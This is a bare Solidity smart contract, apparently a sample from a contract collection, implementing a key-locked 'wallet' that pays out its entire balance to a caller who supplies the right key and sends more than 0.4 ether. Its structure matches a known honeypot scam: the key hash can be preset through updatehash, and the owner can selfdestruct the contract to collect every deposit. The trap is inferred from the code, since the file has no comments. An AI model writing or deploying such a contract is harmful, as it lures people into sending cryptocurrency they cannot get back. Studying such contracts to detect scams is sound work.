1 pragma solidity ^0.4.25;
2 contract contract1
3 {
4     bytes32 keyHash;
5     address owner;
6     bytes32 wallet_id = 0x7483750c06fa3c312c684385f6c2a21c71e4582bd0dbd9492b1c0cf10a199099;
7 
8     constructor() public {
9         owner = msg.sender;
10     }
11 
12     function withdraw(string key) public payable
13     {
14         require(msg.sender == tx.origin);
15         if(keyHash == keccak256(abi.encodePacked(key))) {
16             if(msg.value > 0.4 ether) {
17                 msg.sender.transfer(address(this).balance);
18             }
19         }
20     }
21 
22     function setup_key(string key) public
23     {
24         if (keyHash == 0x0) {
25             keyHash = keccak256(abi.encodePacked(key));
26         }
27     }
28 
29     function updatehash(bytes32 new_hash) public
30     {
31         if (keyHash == 0x0) {
32             keyHash = new_hash;
33         }
34     }
35 
36     function clear() public
37     {
38         require(msg.sender == owner);
39         selfdestruct(owner);
40     }
41 
42     function get_id() public view returns(bytes32){
43         return wallet_id;
44     }
45 
46     function () public payable {
47     }
48 }